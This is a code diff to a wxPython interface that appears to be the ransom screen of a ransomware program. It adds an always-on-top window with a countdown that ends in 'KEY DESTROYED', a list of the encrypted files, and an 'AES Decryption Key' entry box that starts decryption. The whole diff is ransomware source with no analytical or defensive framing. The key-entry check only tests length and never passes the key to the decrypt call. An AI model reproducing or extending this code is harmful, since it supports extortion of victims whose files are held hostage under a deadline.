@@ -34,14 +34,16 @@ import wx.xrc
 
 class MyFrame1 ( wx.Frame ):
     
-    def __init__( self, parent, image_path, KEY_DESTRUCT_TIME_SECONDS, start_time):
+    def __init__( self, parent, image_path, KEY_DESTRUCT_TIME_SECONDS, start_time, file_list_path, decrypter):
         self.message = "blank"
         self.image_path = image_path
+        self.decrypter = decrypter
+        self.file_list_path = file_list_path
         # Time if initial encryption
         self.start_time = start_time
         self.KEY_DESTRUCT_TIME_SECONDS = KEY_DESTRUCT_TIME_SECONDS
         
-        wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 900,700 ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL )
+        wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 900,700 ), style = wx.CAPTION|wx.TAB_TRAVERSAL|wx.STAY_ON_TOP|wx.MINIMIZE_BOX|wx.SYSTEM_MENU|wx.CLOSE_BOX )
         
         self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
         
@@ -240,13 +242,32 @@ class MyFrame1 ( wx.Frame ):
         
         self.SetSizer( bSizer1 )
         self.Layout()
+        
+        # Create timer
         self.m_timer2 = wx.Timer()
         self.m_timer2.SetOwner( self, wx.ID_ANY )
         self.m_timer2.Start( 500 )
         
         self.Bind(wx.EVT_TIMER, self.blink, self.m_timer2)
         
+        # Create button events
+        self.Bind(wx.EVT_BUTTON, self.files_dialog, self.m_button1)
+        self.Bind(wx.EVT_BUTTON, self.decrypt_dialog, self.m_button11)
+        
         self.Centre( wx.BOTH )
+        
+    
+    def files_dialog(self, event):
+        # Controls the encrypted files list dialog
+        
+        dialog = MyFrame2(self, self.file_list_path)
+        dialog.Show()
+        
+    def decrypt_dialog(self, event):
+        # Controls the decryption dialog 
+        
+        dialog = MyDialog1(self, self.decrypter)
+        dialog.Show()
         
     def time_remaining(self):
         # Get's time remaining until key destruction
@@ -254,6 +275,8 @@ class MyFrame1 ( wx.Frame ):
         seconds_elapsed = int(time.time() - int(self.start_time))
     
         _time_remaining = self.KEY_DESTRUCT_TIME_SECONDS - seconds_elapsed
+        if _time_remaining <= 0:
+            return "KEY DESTROYED"
         
         minutes, seconds = divmod(_time_remaining, 60)
         hours, minutes = divmod(minutes, 60)
@@ -280,3 +303,140 @@ class MyFrame1 ( wx.Frame ):
     def __del__( self ):
         pass
     
+
+###########################################################################
+## Class MyFrame2
+###########################################################################
+
+class MyFrame2 ( wx.Frame ):
+    
+    def __init__( self, parent, file_path_list ):
+        self.file_path_list = file_path_list
+        wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 500,300 ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL|wx.STAY_ON_TOP )
+        
+        self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
+        
+        bSizer12 = wx.BoxSizer( wx.VERTICAL )
+        
+        self.m_panel13 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
+        bSizer13 = wx.BoxSizer( wx.VERTICAL )
+        
+        self.m_textCtrl1 = wx.TextCtrl( self.m_panel13, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, wx.TE_DONTWRAP|wx.TE_MULTILINE|wx.TE_READONLY )
+        self.m_textCtrl1.LoadFile(self.file_path_list)
+        bSizer13.Add( self.m_textCtrl1, 3, wx.ALL|wx.EXPAND, 5 )
+        
+        
+        self.m_panel13.SetSizer( bSizer13 )
+        self.m_panel13.Layout()
+        bSizer13.Fit( self.m_panel13 )
+        bSizer12.Add( self.m_panel13, 1, wx.ALL|wx.EXPAND, 5 )
+        
+        
+        self.SetSizer( bSizer12 )
+        self.Layout()
+        
+        self.Centre( wx.BOTH )
+    
+    def __del__( self ):
+        pass
+
+
+###########################################################################
+## Class MyDialog1
+###########################################################################
+
+class MyDialog1 ( wx.Dialog ):
+    
+    def __init__( self, parent, decrypter ):
+        self.decrypter = decrypter
+        wx.Dialog.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 500,200 ), style = wx.DEFAULT_DIALOG_STYLE|wx.STAY_ON_TOP )
+        
+        self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
+        
+        bSizer14 = wx.BoxSizer( wx.VERTICAL )
+        
+        self.m_panel14 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
+        sbSizer2 = wx.StaticBoxSizer( wx.StaticBox( self.m_panel14, wx.ID_ANY, u"AES Decryption Key" ), wx.VERTICAL )
+        
+        
+        sbSizer2.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
+        
+        
+        sbSizer2.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
+        
+        bSizer16 = wx.BoxSizer( wx.HORIZONTAL )
+        
+        
+        bSizer16.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
+        
+        self.m_textCtrl2 = wx.TextCtrl( sbSizer2.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
+        self.m_textCtrl2.SetMaxLength( 32 ) 
+        self.m_textCtrl2.SetMinSize( wx.Size( 220,-1 ) )
+        
+        bSizer16.Add( self.m_textCtrl2, 0, wx.ALL, 5 )
+        
+        
+        bSizer16.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
+        
+        
+        sbSizer2.Add( bSizer16, 1, wx.EXPAND, 5 )
+        
+        
+        sbSizer2.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
+        
+        m_sdbSizer1 = wx.StdDialogButtonSizer()
+        self.m_sdbSizer1OK = wx.Button( sbSizer2.GetStaticBox(), wx.ID_OK )
+        m_sdbSizer1.AddButton( self.m_sdbSizer1OK )
+        self.m_sdbSizer1Cancel = wx.Button( sbSizer2.GetStaticBox(), wx.ID_CANCEL )
+        m_sdbSizer1.AddButton( self.m_sdbSizer1Cancel )
+        m_sdbSizer1.Realize();
+        
+        sbSizer2.Add( m_sdbSizer1, 1, wx.EXPAND, 5 )
+        
+        self.m_staticText6 = wx.StaticText( sbSizer2.GetStaticBox(), wx.ID_ANY, u"Waiting for input", wx.DefaultPosition, wx.DefaultSize, 0 )
+        self.m_staticText6.Wrap( -1 )
+        sbSizer2.Add( self.m_staticText6, 0, wx.ALL, 5 )
+        
+        self.m_gauge1 = wx.Gauge( sbSizer2.GetStaticBox(), wx.ID_ANY, 100, wx.DefaultPosition, wx.DefaultSize, wx.GA_HORIZONTAL )
+        self.m_gauge1.SetValue( 0 ) 
+        sbSizer2.Add( self.m_gauge1, 0, wx.ALL, 5 )
+        
+        
+        self.m_panel14.SetSizer( sbSizer2 )
+        self.m_panel14.Layout()
+        sbSizer2.Fit( self.m_panel14 )
+        bSizer14.Add( self.m_panel14, 1, wx.EXPAND |wx.ALL, 5 )
+        
+        
+        # Button event for OK
+        self.Bind(wx.EVT_BUTTON, self.decrypt, self.m_sdbSizer1OK)
+        
+        
+        self.SetSizer( bSizer14 )
+        self.Layout()
+        
+        self.Centre( wx.BOTH )
+        
+        
+    def decrypt(self, event):
+        # Function to call decryption of encrypted files
+        
+        # Get value of box
+        key_contents = self.m_textCtrl2.GetLineText(0)
+        
+        # Check for valid key
+        if len(key_contents) < 32:
+            self.m_staticText6.SetLabelText("Invalid Key!")
+            return
+        else:
+            self.m_staticText6.SetLabelText("Decrypting! Please Wait")
+            
+        # Now start the decryption 
+        self.decrypter.decrypt_files()
+        self.m_gauge1.SetValue(100)
+        self.m_staticText6.SetLabelText("Decryption Complete!")
+    
+    def __del__( self ):
+        pass
+    
+
